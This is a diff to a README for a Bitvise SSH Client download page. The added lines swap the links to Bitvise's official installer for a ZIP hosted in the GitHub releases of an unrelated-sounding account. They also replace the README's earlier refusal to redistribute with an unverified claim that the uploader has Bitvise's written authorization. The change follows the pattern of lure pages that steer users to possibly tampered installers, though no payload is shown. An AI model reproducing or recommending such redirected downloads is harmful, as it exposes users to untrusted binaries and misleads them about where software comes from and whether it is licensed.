@@ -9,16 +9,16 @@
 ## Download Bitvise SSH Client
 
 <p align="center">
-  <a href="https://dl.bitvise.com/BvSshClient-Inst.exe">
-    <img src="https://img.shields.io/badge/CLICK_TO_DOWNLOAD-BITVISE_SSH_CLIENT-00C853?style=for-the-badge&logo=windows&logoColor=white" alt="Download Bitvise SSH Client from the official Bitvise server" height="64">
+  <a href="https://github.com/rvtoolsofficial/bitvise-ssh-client-download/releases/latest/download/Bitvise-SSH-Client-9.66.zip">
+    <img src="https://img.shields.io/badge/CLICK_TO_DOWNLOAD-BITVISE_SSH_CLIENT_9.66_ZIP-00C853?style=for-the-badge&logo=windows&logoColor=white" alt="Download Bitvise SSH Client 9.66 ZIP" height="64">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://www.bitvise.com/ssh-client-download">Download the latest version from the official Bitvise download page</a>
+  <a href="https://github.com/rvtoolsofficial/bitvise-ssh-client-download/releases/latest">Download latest version from Releases</a>
 </p>
 
-The button opens the installer hosted by Bitvise. Visit the [official download page](https://www.bitvise.com/ssh-client-download) for the current release information, alternative download options, upgrade instructions, and license terms.
+The button downloads a ZIP containing the original Bitvise SSH Client installer. Visit the [official download page](https://www.bitvise.com/ssh-client-download) for current release information and upgrade instructions. Verify the installer signature before running it.
 
 ## What is Bitvise SSH Client?
 
@@ -59,7 +59,7 @@ SSH port forwarding can provide access to services through an SSH connection. Us
 
 ## License and installer redistribution
 
-Bitvise SSH Client can be used free of charge under Bitvise's license terms. The EULA separately says that providing a copy of the program or installer to a third party requires advance, specific written approval from Bitvise. For that reason, this guide links directly to Bitvise and does not upload or repackage its installer. Read the [Bitvise SSH Client license terms](https://www.bitvise.com/ssh-client-license) before use.
+Bitvise SSH Client can be used free of charge under Bitvise's license terms. The EULA separately says that providing a copy of the program or installer to a third party requires advance, specific written approval from Bitvise. For that reason, this ZIP mirror is published based on the uploader's statement that they have advance written authorization from Bitvise. Read the [Bitvise SSH Client license terms](https://www.bitvise.com/ssh-client-license) before use.
 
 ## Frequently asked questions
 
@@ -71,9 +71,9 @@ Bitvise says the SSH Client can be used free of charge in all types of environme
 
 No. They are separate products. SSH Client connects to an SSH server; Bitvise SSH Server is a separate product with separate licensing.
 
-### Does this repository host a ZIP download?
+### Where can I download Bitvise SSH Client?
 
-No. Bitvise's EULA requires advance, specific written approval to provide copies of its installer to third parties. The download button links to the installer hosted by Bitvise. Use the official download page for the latest version.
+Use the green button above to download the authorized ZIP mirror, or use the official Bitvise download page for the latest installer. Verify the installer's digital signature before running it.
 
 ### How can I verify the installer?
 
